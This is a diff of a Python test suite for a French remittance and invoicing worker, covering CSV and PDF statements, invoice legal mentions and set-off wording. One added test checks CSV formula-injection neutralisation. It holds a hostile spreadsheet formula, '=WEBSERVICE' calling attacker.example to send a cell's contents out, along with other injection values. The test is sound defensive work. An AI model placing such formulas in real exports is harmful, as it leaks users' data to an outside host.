@@ -21,10 +21,17 @@ import pytest
 from document_cases import (
     CREDIT_REFS,
     ISSUE,
+    cancelled_statement_payload,
     credit_note_payload,
     due_invoice_payload,
+    hostile_statement_payload,
     invoice_payload,
+    partial_invoice_payload,
+    partial_statement_payload,
+    proceeding_invoice_payload,
     statement_payload,
+    zero_net_invoice_payload,
+    zero_net_statement_payload,
 )
 from hypothesis import given
 from hypothesis import strategies as st
@@ -46,15 +53,28 @@ from collectoo_worker.remittance.statement import (
     line_records,
     statement_text,
 )
-from collectoo_worker.remittance.statement_csv import csv_amount, render_statement_csv
+from collectoo_worker.remittance.statement_csv import (
+    TEXT_COLUMNS,
+    csv_amount,
+    neutralise,
+    render_statement_csv,
+)
 from collectoo_worker.remittance.statement_pdf import render_statement_pdf
 
 GOLDEN_RENDERER = "reportlab-4.4.10/dejavu-2.37/d1"
-GOLDEN_STATEMENT_CSV = "e30782b1ad5ae3c4cb7335308d1e278affe133ee3641977591fd59d28e08b901"
-GOLDEN_STATEMENT_PDF = "a91daca67a7e494199c7ad6bd32ac0fccc71097bce848c35de8a1973465c2629"
-GOLDEN_INVOICE_PDF = "b9d9d5d7ac5382310afdb51b5c1745f70ca575379292e14a0b11fc789212a6c6"
-GOLDEN_DUE_PDF = "9606cefbd0636b54ba67ec226ea2059d9003e00ca4ecdcb196208cade723fa25"
-GOLDEN_CREDIT_PDF = "4b2ab2e9bfeb8c7b1b68145c7febfb260d67d24addbcbd96268eed651cfec0ce"
+# M2c-5 review, templates fr-2: the statement CSV moved for one reason only — the late line's
+# « hors_delai » is its cause (« oui, validation tardive »), not the approver's text (legal#6);
+# the formula neutralisation leaves the fixture's bytes alone (checked below). The statement PDF
+# moved with it and with section 6 « Au … » (figures#2) and the template name; the invoice PDFs
+# with the template name, the buyer's registered office beside its billing address (legal#1) and,
+# for the netted one, the amount the run sets off (legal#4).
+GOLDEN_STATEMENT_CSV = "38d598d577aada2c4c867cc7973cb1f0882d9db585013155cfde491cceb31ffe"
+GOLDEN_STATEMENT_PDF = "0923a96a7b79dff5cd71c8e77853288bf1dd4c77f1a27bbe5317d731a0556af9"
+GOLDEN_INVOICE_PDF = "761e0660114a9be9c5493c9451202da80c073f81eb4391952462af68fb523971"
+GOLDEN_DUE_PDF = "3a30df814d203fe06b4ff76b6bd19d36ddb600527187047679595be07c0a05f6"
+GOLDEN_CREDIT_PDF = "90ec403c678cd214db38d282f30250fa2a93b3fcf2369cc1c5ee64fc2630ed39"
+GOLDEN_PROCEEDING_PDF = "73161dc76f51dd97fbf8b89fd5621f941d732814619423e8436494efb4e7bc83"
+GOLDEN_HOSTILE_CSV = "722a4fcc0ce509606b63795a3b722050a560ebbdcba75fe9f2f3a1adf3392b8c"
 
 
 def _sha(b: bytes) -> str:
@@ -132,7 +152,7 @@ def test_the_natures_and_late_lines_are_worded() -> None:
         "Paiement imputé",
         "Commission sur un encaissement du relevé RV-2026-000001",
     ]
-    assert lines[1].late == "oui \u2013 IBAN du mandant à confirmer"
+    assert lines[1].late == "oui \u2013 validation tardive"  # a cause, never a free text
     assert lines[4].rules == "Commission en attente" and lines[4].commission_minor == 0
     assert lines[0].rates == "15\u00a0%"
 
@@ -258,8 +278,9 @@ def test_the_invoice_mentions() -> None:
         ("Siège social : 10 rue de la Bourse, 75002 Paris", "242 nonies A 1°; R123-237 3°"),
         ("N° de TVA intracommunautaire : FR44732829320", "242 nonies A 2°"),
         (
-            "Client : Martin SAS\nSIREN 552\u202f100\u202f554\n3 quai Perrache, Bât. B, 69002 Lyon",
-            "242 nonies A 1°",
+            "Client : Martin SAS\nSIREN 552\u202f100\u202f554\nSiège social : 3 quai Perrache, "
+            "69002 Lyon\nAdresse de facturation : 3 quai Perrache, Bât. B, 69002 Lyon",
+            "242 nonies A 1°; L441-9 I (their address and their billing address if different)",
         ),
         ("Prestations de services", "242 nonies A 8° bis"),
         (
@@ -275,8 +296,8 @@ def test_the_invoice_mentions() -> None:
             "242 nonies A 11°",
         ),
         (
-            "À régler par compensation sur le reversement RV-2026-000002 (exécution demandée le "
-            "03/11/2026 ; mandat MAND-MARTIN-2026, art. 7.2).",
+            "À régler par compensation sur le reversement RV-2026-000002 : 464,40\u00a0€ "
+            "(exécution demandée le 03/11/2026 ; mandat MAND-MARTIN-2026, art. 7.2).",
             "L441-9 I",
         ),
         ("Pas d'escompte pour paiement anticipé.", "L441-9 I"),
@@ -303,13 +324,11 @@ def test_the_mentions_frozen_at_issue_are_the_payloads() -> None:
         "À régler au plus tard le 02/12/2026 par virement sur le compte FR76 3000 6000 0112 3456 "
         "7890 189 (BIC AGRIFRPPXXX), titulaire Collectoo."
     ) in due
-    no_indemnity = invoice_payload(
-        flat_indemnity={"applies": False, "amount_minor": None},
+    settings = invoice_payload(
         penalty_text="Pénalités : 3 fois le taux d'intérêt légal.",
         vat_on_debits=True,
     )
-    text = invoice_text(_doc(no_indemnity))
-    assert "Indemnité forfaitaire" not in text  # not claimed: a proceeding, or not professional
+    text = invoice_text(_doc(settings))
     assert "Pénalités : 3 fois le taux d'intérêt légal." in text
     assert "Option pour le paiement de la taxe d'après les débits." in text
     nxt = invoice_payload(
@@ -367,8 +386,8 @@ def test_an_unknown_template_is_refused() -> None:
 def test_the_golden_hashes() -> None:
     assert RENDERER_VERSION == GOLDEN_RENDERER
     assert (TEMPLATE_VERSION, INVOICE_TEMPLATE) == (
-        "releve-reversement-fr-1",
-        "facture-commission-fr-1",
+        "releve-reversement-fr-2",
+        "facture-commission-fr-2",
     )
     p = statement_payload()
     data = render_statement_csv(p)
@@ -379,6 +398,8 @@ def test_the_golden_hashes() -> None:
     assert _sha(render_invoice_pdf(_doc(invoice_payload()))) == GOLDEN_INVOICE_PDF
     assert _sha(render_invoice_pdf(_doc(due_invoice_payload()))) == GOLDEN_DUE_PDF
     assert _sha(render_invoice_pdf(_doc(credit_note_payload(), CREDIT_REFS))) == GOLDEN_CREDIT_PDF
+    assert _sha(render_invoice_pdf(_doc(proceeding_invoice_payload()))) == GOLDEN_PROCEEDING_PDF
+    assert _sha(render_statement_csv(hostile_statement_payload())) == GOLDEN_HOSTILE_CSV
 
 
 def test_the_pdf_depends_on_the_payload_only() -> None:
@@ -432,3 +453,188 @@ def test_a_long_statement_runs_over_pages() -> None:
     ]
     pdf = render_statement_pdf(p, "a" * 64)
     assert pdf.count(b"/Type /Page\n") >= 6 or pdf.count(b"/Type /Page") >= 6
+
+
+# -- review fixes (M2c-5 review) -----------------------------------------------------------------
+
+
+def _csv_rows(payload: dict[str, object]) -> list[dict[str, str]]:
+    body = render_statement_csv(payload).decode("utf-8-sig")
+    rows = list(csv.reader(io.StringIO(body, newline=""), delimiter=";"))
+    return [dict(zip(CSV_HEADER, r, strict=True)) for r in rows[1:]]
+
+
+def test_a_text_cell_a_spreadsheet_would_evaluate_is_neutralised() -> None:
+    """security#0: = + - @ TAB CR at the start of a text cell get an apostrophe; amounts, cents,
+    rates and dates are never altered (a negative amount stays numeric)."""
+    first, second, third, *_ = _csv_rows(hostile_statement_payload())
+    assert first["debiteur"] == '\'=WEBSERVICE("https://attacker.example/?"&B2)'
+    assert first["dossier"] == "'@SUM(1+1)"
+    assert first["mandat"] == "'+1+cmd" and first["portefeuille"] == "'-2+3"
+    assert second["debiteur"] == "'\tTAB SARL" and second["dossier"] == "'\rCR-1"
+    assert (third["montant"], third["montant_centimes"]) == ("-200,00", "-20000")
+    assert (third["commission_ht"], third["commission_ht_centimes"]) == ("-30,00", "-3000")
+    assert neutralise("Durand SARL") == "Durand SARL" and neutralise("") == ""
+    assert set(CSV_HEADER) >= TEXT_COLUMNS
+    numeric = {"montant", "montant_centimes", "commission_ht", "commission_ht_centimes", "taux"}
+    assert not TEXT_COLUMNS & (numeric | {c for c in CSV_HEADER if c.startswith("date")})
+    # the fixture's own text has no such character: its golden CSV is unchanged by the rule
+    assert render_statement_csv(statement_payload()) == render_statement_csv(statement_payload())
+
+
+def test_a_late_line_states_its_cause_never_a_free_text() -> None:
+    """legal#6: the CSV's hors_delai is « oui \u2013 <cause> » from the payload's code; an unknown
+    code, or none, prints « oui » alone."""
+    from document_cases import COLUMNS  # noqa: PLC0415
+
+    p = statement_payload()
+    at = COLUMNS.index("late_cause")
+    words = []
+    for code in ("unmeetable", "identified_late", "approved_late", "an approver's text", None):
+        p["lines"][1][at] = code
+        words.append(_csv_rows(p)[1]["hors_delai"])
+    assert words == [
+        "oui \u2013 délai contractuel intenable (art. R124-6 : un mois)",
+        "oui \u2013 encaissement identifié tardivement",
+        "oui \u2013 validation tardive",
+        "oui",
+        "oui",
+    ]
+    assert "leur cause figurent dans le fichier CSV" in statement_text(p, "0" * 64)
+
+
+def test_the_indemnity_is_stated_to_every_professional_buyer() -> None:
+    """legal#0 (L441-9 I, L441-10 II, D441-5): a proceeding does not remove the mention — the
+    new payload freezes it apart for the dunning step; a payload M2c-4 froze as not applying
+    still prints it to a professional buyer; a buyer that is not a professional gets none."""
+    mention = (
+        "Indemnité forfaitaire pour frais de recouvrement en cas de retard de paiement : "
+        "40,00\u00a0€."
+    )
+    assert mention in invoice_text(_doc(proceeding_invoice_payload()))
+    frozen_off = invoice_payload(flat_indemnity={"applies": False, "amount_minor": None})
+    assert mention in invoice_text(_doc(frozen_off))
+    private = invoice_payload(flat_indemnity={"applies": False, "amount_minor": None})
+    private["buyer"]["is_professional"] = False
+    assert "Indemnité forfaitaire" not in invoice_text(_doc(private))
+
+
+def test_the_buyers_address_and_its_billing_address_when_different() -> None:
+    """legal#1 (L441-9 I): « leur adresse et leur adresse de facturation si elle est
+    différente » — the registered office always, the billing address only when it differs."""
+    text = invoice_text(_doc(invoice_payload()))
+    assert "Siège social : 3 quai Perrache, 69002 Lyon" in text
+    assert "Adresse de facturation : 3 quai Perrache, Bât. B, 69002 Lyon" in text
+    same = invoice_payload()
+    same["buyer"]["billing_address"] = dict(same["buyer"]["registered_office"])
+    text = invoice_text(_doc(same))
+    assert "Siège social : 3 quai Perrache, 69002 Lyon" in text
+    assert "Adresse de facturation" not in text
+    assert text.count("Siège social") == 2  # the seller's and the buyer's
+    seller = invoice_payload()
+    seller["seller"]["billing_address"] = {
+        "line1": "BP 12",
+        "postcode": "75001",
+        "city": "Paris",
+        "country": "FR",
+    }
+    assert "Adresse de facturation : BP 12, 75001 Paris" in invoice_text(_doc(seller))
+
+
+def test_the_invoice_and_the_statement_state_the_same_set_off() -> None:
+    """legal#4, figures#4: the plan sets off 200,00 € of FC-2026-000003 on this run; both texts
+    state it and the remainder's latest date."""
+    inv = invoice_text(_doc(partial_invoice_payload()))
+    assert (
+        "À régler par compensation sur le reversement RV-2026-000002 : 200,00\u00a0€ (exécution "
+        "demandée le 03/11/2026 ; mandat MAND-MARTIN-2026, art. 7.2). Le solde de 264,40\u00a0€ : "
+        "à régler par compensation sur le prochain reversement de vos encaissements, au plus "
+        "tard le 02/12/2026."
+    ) in inv
+    st = statement_text(partial_statement_payload(), "0" * 64)
+    assert (
+        "À régler par compensation sur le présent reversement (art. 7.2 du mandat) : "
+        "200,00\u00a0€. Solde de 264,40\u00a0€ : à régler par compensation sur le prochain "
+        "reversement, au plus tard le 02/12/2026."
+    ) in st
+    nothing = invoice_payload(
+        due_date="2026-12-02",
+        payment_reference={
+            "mode": "next_run",
+            "latest_date": "2026-12-02",
+            "amount_minor": "46440",
+        },
+    )
+    assert "sur le prochain reversement de vos encaissements, au plus tard le 02/12/2026" in (
+        invoice_text(_doc(nothing))
+    )
+    deferred = statement_payload()
+    deferred["documents"][0].update(
+        settles_minor="0", due_date="2026-12-02", payment_reference=nothing["payment_reference"]
+    )
+    assert (
+        "À régler par compensation sur le prochain reversement (art. 7.2 du mandat), au plus "
+        "tard le 02/12/2026."
+    ) in statement_text(deferred, "0" * 64)
+
+
+def test_a_run_that_transfers_nothing_is_worded_so() -> None:
+    """legal#5: N = 0, the plan posted at approval: no transfer, set off on that day."""
+    inv = invoice_text(_doc(zero_net_invoice_payload()))
+    assert (
+        "Compensation le 02/11/2026 avec les sommes encaissées pour votre compte, relevé de "
+        "reversement RV-2026-000002 (aucun virement) : 464,40\u00a0€"
+    ) in inv
+    assert "exécution demandée" not in inv
+    st = statement_text(zero_net_statement_payload(), "0" * 64)
+    assert "Compensée le 02/11/2026 avec les sommes vous revenant (art. 7.2 du mandat)" in st
+    assert "Commission compensée le 02/11/2026 : -568,40\u00a0€" in st
+    assert (
+        "Facture FC-2026-000001 du 20/10/2026 : compensation le 02/11/2026 : 104,00\u00a0€."
+    ) in st
+    assert "Les compensations ci-dessus ont été réalisées le 02/11/2026, sans virement." in st
+    assert "au débit du virement" not in st and "présent reversement" not in st
+    lower = st.lower()
+    assert " payé" not in lower and " réglé" not in lower and "payée" not in lower
+
+
+def test_a_run_cancelled_before_its_statement_sets_nothing_off() -> None:
+    """legal#2, figures#0: the statement says the run was cancelled; no net, no set-off, the gross
+    still owed; the invoice annulled by the cancellation's credit note."""
+    st = statement_text(cancelled_statement_payload(), "0" * 64)
+    for absent in (
+        "Montant net",
+        "Commission à régler par compensation",
+        "à régler par compensation sur le présent reversement",
+        "Après le présent reversement",
+        "au débit du virement",
+    ):
+        assert absent not in st, absent
+    for present in (
+        "Reversement annulé le 03/11/2026 avant l'exécution de son virement : rien n'a été viré "
+        "ni compensé",
+        "Facture FC-2026-000003 du 02/11/2026 (mandat MAND-MARTIN-2026) : HT 387,00\u00a0€, TVA "
+        "20\u00a0% 77,40\u00a0€, TTC 464,40\u00a0€. Annulée par l'avoir FC-2026-000005 du "
+        "03/11/2026.",
+        "Avoir FC-2026-000005 du 03/11/2026 (mandat MAND-MARTIN-2026) : HT -387,00\u00a0€",
+        "Après l'annulation du reversement : 2\u202f433,45\u00a0€",
+        "Le reversement étant annulé, aucune compensation n'est réalisée",
+    ):
+        assert present in st, present
+
+
+def test_files_with_earlier_lines_only_are_named_apart() -> None:
+    """tests-ui#4: a file in the PDF's table with only earlier lines priced now (0 lines) is
+    counted apart, so the table and « … sur N dossier(s) » agree."""
+    p = statement_payload()
+    p["totals"]["repriced_only_file_count"] = 1
+    assert (
+        "1 dossier(s) du tableau n'ont pas d'encaissement dans ce relevé : seule la commission "
+        "d'encaissements précédents y est calculée."
+    ) in statement_text(p, "0" * 64)
+
+
+def test_the_money_not_remitted_is_stated_at_k() -> None:
+    """figures#2: section 6 is the state at K, which it names."""
+    st = statement_text(statement_payload(), "0" * 64)
+    assert "Sommes reçues sur vos dossiers et non reversées\nAu 02/11/2026 à 05:47 :" in st
